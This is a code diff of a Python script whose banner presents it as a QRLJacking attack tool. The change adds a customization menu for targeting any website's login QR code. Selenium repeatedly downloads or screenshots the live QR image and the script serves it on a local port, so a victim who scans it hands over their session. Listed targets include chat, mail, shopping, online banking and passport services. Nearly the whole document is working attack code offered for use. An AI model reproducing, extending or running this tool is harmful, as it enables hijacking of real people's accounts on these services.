@@ -29,7 +29,7 @@ finally:
 	import selenium
 	from selenium import webdriver
 
-#settings = configparser.ConfigParser()
+settings = configparser.ConfigParser()
 
 def Serve_it(port=1337):
 	def serve(port):
@@ -398,7 +398,175 @@ document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
 	f.write(code)
 	f.close()
 
-def Simple_Exploit(classname,url,image_number,s=10):
+def Add_website():
+	print "  1.Find image by class and its number method"
+	print "  2.Find image by its number only method"
+	print "  3.Find image by the screenshot method"
+	print "  00.Back To Main Menu"
+	method = raw_input("\n  Note:Customization doesn\'t support svg images for now\n  Select method > ")
+	if method == "00":
+		main()
+
+	elif int(method) == 1:
+		classname = raw_input("   Classname > ")
+		url = raw_input("   Url > ")
+		image_number = int( raw_input("   Image Number > ") )
+		Seconds = raw_input("   Refresh every (Default 10s) > ")
+		try:
+			int(Seconds)
+		except:
+			Seconds = 10
+		port = raw_input("   Port to listen on (Default 1337) : ")
+		try:
+			int(port)
+		except ValueError:
+			port = 1337
+		print " [+] Saving settings..."
+		settings.read("Data/Custom.ini")
+		name = url.replace("http://","").replace("https://","").split("/")[0]
+		settings.add_section(name)
+		settings.set(name,"method","1")
+		settings.set(name,"classname",classname)
+		settings.set(name,"url",url)
+		settings.set(name,"image_number",str(image_number))
+		settings.set(name,"Seconds",str(Seconds))
+		settings.write(open("Data/Custom.ini","wb"))
+		clear()
+		print " [+] Settings saved."
+		print " [+] Running the exploit..."
+		print "="*12
+		make()
+		Serve_it(port)
+		First_Method(classname,url,image_number,Seconds)
+		main()
+
+	elif int(method) == 2:
+		url = raw_input("   Url > ")
+		image_number = int( raw_input("   Image Number > ") )
+		Seconds = raw_input("   Refresh every (Default 10s) > ")
+		try:
+			int(Seconds)
+		except:
+			Seconds = 10
+		port = raw_input("   Port to listen on (Default 1337) : ")
+		try:
+			int( port )
+		except ValueError:
+			port = 1337
+		print " [+] Saving settings..."
+		settings.read("Data/Custom.ini")
+		name = url.replace("http://","").replace("https://","").split("/")[0]
+		settings.add_section(name)
+		settings.set(name,"method","2")
+		settings.set(name,"url",url)
+		settings.set(name,"image_number",str(image_number))
+		settings.set(name,"Seconds",str(Seconds))
+		settings.write(open("Data/Custom.ini","wb"))
+		clear()
+		print " [+] Settings saved."
+		print " [+] Running the exploit..."
+		print "="*12
+		make()
+		Serve_it( port )
+		Second_Method( url , image_number , Seconds )
+		main()
+
+	elif int(method) == 3:
+		url = raw_input("   Url > ")
+		image_number = int( raw_input("   Image Number (To get its width and location)> ") )
+		Seconds = raw_input("   Refresh every (Default 10s) > ")
+		try:
+			int(Seconds)
+		except:
+			Seconds = 10
+		port = raw_input("   Port to listen on (Default 1337) : ")
+		try:
+			int( port )
+		except ValueError:
+			port = 1337
+		print " [+] Saving settings..."
+		settings.read("Data/Custom.ini")
+		name = url.replace("http://","").replace("https://","").split("/")[0]
+		settings.add_section(name)
+		settings.set(name,"method","3")
+		settings.set(name,"url",url)
+		settings.set(name,"image_number",str(image_number))
+		settings.set(name,"Seconds",str(Seconds))
+		settings.write(open("Data/Custom.ini","wb"))
+		clear()
+		print " [+] Settings saved."
+		print " [+] Running the exploit..."
+		print "="*12
+		make()
+		Serve_it( port )
+		Third_Method( url , image_number , Seconds )
+		main()
+
+	else:
+		main()
+
+def Use_website():
+	settings.read("Data/Custom.ini")
+	print "\n"
+	for n,w in enumerate(settings.sections()):
+		print " "+str(n)+"."+w.encode("utf-8")
+	print " 00.Back To Main Menu"
+	website = raw_input("\n  Select website > ")
+	websites = settings.sections()
+	if website == "00":
+		main()
+	try:
+		section = websites[int(website)]
+	except:
+		Use_website()
+
+	method = int( settings.get(section,"method") )
+
+	if int(method) == 1:
+		classname = settings.get(section,"classname")
+		url = settings.get(section,"url")
+		image_number = settings.get(section,"image_number")
+		Seconds = settings.get(section,"Seconds")
+		First_Method(classname,url,image_number,Seconds)
+		main()
+
+	elif int(method) == 2:
+		url = settings.get(section,"url")
+		image_number = settings.get(section,"image_number")
+		Seconds = settings.get(section,"Seconds")
+		Second_Method(url,image_number,Seconds)
+		main()
+
+	elif int(method) == 3:
+		url = settings.get(section,"url")
+		image_number = settings.get(section,"image_number")
+		Seconds = settings.get(section,"Seconds")
+		Third_Method(url,image_number,Seconds)
+		main()
+
+	else:
+		Use_website()
+
+def Remove_website():
+	settings.read("Data/Custom.ini")
+	print "\n"
+	for n,w in enumerate(settings.sections()):
+		print " "+str(n)+"."+w.encode("utf-8")
+	print " 00.Back To Main Menu"
+	website = raw_input("\n  Select website > ")
+	websites = settings.sections()
+	if website == "00":
+		main()
+	try:
+		section = websites[int(website)]
+	except:
+		Remove_website()
+	settings.remove_section(section)
+	print " [!] Website removed."
+	time.sleep(5)
+	main()
+
+def First_Method(classname,url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
 	print " [+]Navigating To Website.."
@@ -421,14 +589,61 @@ def Simple_Exploit(classname,url,image_number,s=10):
 		except:
 			break
 
+def Second_Method(url,image_number,s=10):
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get(url)
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			imgs = driver.find_elements_by_tag_name('img')
+			img = imgs[int(image_number)]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(s)
+			print " [!]Refreshing page..."
+			driver.refresh()
+			continue
+		except:
+			break
+
+def Third_Method(url,image_number,s=10):
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get(url)
+	time.sleep(10)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			driver.save_screenshot('tmp.png') #screenshot entire page
+			img = driver.find_elements_by_tag_name("img")[int(image_number)]
+			print " [+]The QR code image found !"
+			location = img.location
+			size = img.size
+			print " [+]Grabbing photo.."
+			Screenshot("tmp.png" ,location ,size)
+			print " [#]Saved To tmp.png"
+			time.sleep(s)
+			print " [!]Refreshing page..."
+			driver.refresh()
+			continue
+		except:
+			break
+
 def main():
 	clear()
-	print """\n
-	  ___         _       _               _
-	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
-	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
-	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
-	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|
+	print """
+  ___  ____  _         _            _
+ / _ \|  _ \| |       | | __ _  ___| | _____ _ __
+| | | | |_) | |    _  | |/ _` |/ __| |/ / _ | '__|
+| |_| |  _ <| |___| |_| | (_| | (__|   |  __| |
+ \__\_|_| \_|_____|\___/ \__,_|\___|_|\_\___|_|
 
 # Hacking With Qrljacking Attack Vector Become Easy
 # Coded By karim Shoair | D4Vinci
@@ -441,10 +656,13 @@ def main():
   5.Passport Services
   6.Mobile Management Software
   7.Other Services
-  8.Customization [Soon]
+  8.Customization
 """
-	choice = input(" Choice > ")
-
+	choice = raw_input(" Choice > ")
+	if not choice.isdigit():
+		main()
+	else:
+		choice = int(choice)
 	#Chat Applications
 	if choice == 1:
 		print """
@@ -454,7 +672,7 @@ def main():
  00.Back To Main Menu
 	"""
 
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 
 		if choice_2 == "00":
 			main()
@@ -501,13 +719,16 @@ def main():
 			Weibo()
 			main()
 
+		else:
+			main()
+
 	#Mailing Services
 	if choice == 2:
 		print """
  1.Yandex Mail
  00.Back To Main Menu
 	"""
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 
 		if choice_2 == "00":
 			main()
@@ -528,6 +749,9 @@ def main():
 			Yandex()
 			main()
 
+		else:
+			main()
+
 	#eCommerce
 	if choice == 3:
 		print """
@@ -535,7 +759,7 @@ def main():
  2.Taobao Trips
  00.Back To Main Menu
 	"""
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 		if choice_2 == "00":
 			main()
 
@@ -571,6 +795,9 @@ def main():
 			Taobao()
 			main()
 
+		else:
+			main()
+
 	#Online Banking
 	if choice == 4:
 		print """
@@ -578,7 +805,7 @@ def main():
  2.Yandex Money
  00.Back To Main Menu
 	"""
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 		if choice_2 == "00":
 			main()
 
@@ -614,13 +841,16 @@ def main():
 			Yandex()
 			main()
 
+		else:
+			main()
+
 	#Passport Services
 	if choice == 5:
 		print """
  1.Yandex Passport
  00.Back To Main Menu
 	"""
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 		if choice_2 == "00":
 			main()
 
@@ -640,13 +870,16 @@ def main():
 			Yandex()
 			main()
 
+		else:
+			main()
+
 	#Mobile Management Software
 	if choice == 6:
 		print """
  1.Airdroid
  00.Back To Main Menu
 	"""
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 
 		if choice_2 == "00":
 			main()
@@ -667,6 +900,9 @@ def main():
 			Airdroid()
 			main()
 
+		else:
+			main()
+
 	#Other Services
 	if choice == 7:
 		print """
@@ -676,7 +912,7 @@ def main():
  4.Yelophone
  00.Back To Main Menu
 """
-		choice_2 = raw_input(" Second Choice > ")
+		choice_2 = raw_input("\n Second Choice > ")
 		if choice_2 == "00":
 			main()
 
@@ -744,12 +980,41 @@ def main():
 			Yelophone()
 			main()
 
+		else:
+			main()
+
 	#Customization
-	#if choice == 8:
+	if choice == 8:
+		print " 1.Add a new website."
+		print " 2.Use an existing website."
+		print " 3.Remove an existing website."
+		print " 00.Back To Main Menu"
+
+		choice_2 = raw_input("\n Second Choice > ")
+		if choice_2 == "00":
+			main()
+
+		elif int(choice_2) == 1:
+			Add_website()
+
+		elif int(choice_2) == 2:
+			Use_website()
+
+		elif int(choice_2) == 3:
+			Remove_website()
+
+		else:
+			main()
+
 		#settings.read("Data/Custom.ini")
-		#url = settings.get("WeChat","url")
-		#image_number = settings.get("WeChat","image_number")
-		#classname = settings.get("WeChat","classname")
+		#sections = settings.sections()
+		#url = settings.get(section,"url")
+		#settings.add_section(name)
+		#settings.set(name,"url",url)
+		#settings.write(open("Data/Custom.ini","wb"))
+
+	else:
+		main()
 
 if __name__ == '__main__':
 	main()
